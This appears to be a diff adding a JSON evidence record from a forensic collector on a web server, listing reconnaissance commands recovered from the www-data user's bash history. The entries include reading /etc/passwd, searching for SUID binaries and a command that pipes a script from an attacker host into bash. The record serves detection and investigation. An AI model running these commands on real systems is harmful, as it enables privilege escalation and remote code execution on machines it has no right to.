@@ -1,0 +1,38 @@
+{
+  "collected_at": "2026-02-22T03:00:00Z",
+  "hostname": "webserver01",
+  "check": "discovery_recon",
+  "recon_commands": [
+    {
+      "command": "cat /etc/passwd",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    },
+    {
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    },
+    {
+      "command": "uname -a",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    },
+    {
+      "command": "id",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    },
+    {
+      "command": "ss -tulnp",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    },
+    {
+      "command": "curl -s http://attacker.xyz/linpeas.sh | bash",
+      "user": "www-data",
+      "source": "/var/www/.bash_history"
+    }
+  ],
+  "errors": []
+}
